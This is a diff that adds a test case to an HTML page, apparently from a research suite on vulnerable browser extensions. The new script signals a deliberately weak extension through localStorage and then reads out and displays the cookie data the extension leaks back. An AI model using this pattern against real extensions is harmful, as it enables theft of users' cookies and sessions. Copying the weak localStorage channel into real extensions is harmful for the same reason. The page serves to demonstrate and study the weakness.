@@ -72,5 +72,25 @@
 			}, 350);
 		</script>
 
+		<br/>
+		<br/>
+		<br/>
+
+		<!-- (d) /vuln01_weak_mv3_localStorage -->
+		<span id="cookies3"></span>
+		<script>
+			// "Request" cookies from content script:
+			setTimeout(function() {
+				localStorage.setItem("cookies", "please");
+			}, 200);
+
+			// Read out requested cookies:
+			setTimeout(function() {
+				let leaked_cookie_data = localStorage.getItem("cookies");
+				document.getElementById('cookies3').innerText = "Leaked cookie data (received via localStorage): "
+					+ leaked_cookie_data.substring(0, 1000) + " ... " + leaked_cookie_data.substring(leaked_cookie_data.length-1000);
+			}, 2000); // We need to wait some time here as /vuln01_weak_mv3_localStorage/content.js only checks every 500ms.
+		</script>
+
 	</body>
 </html>
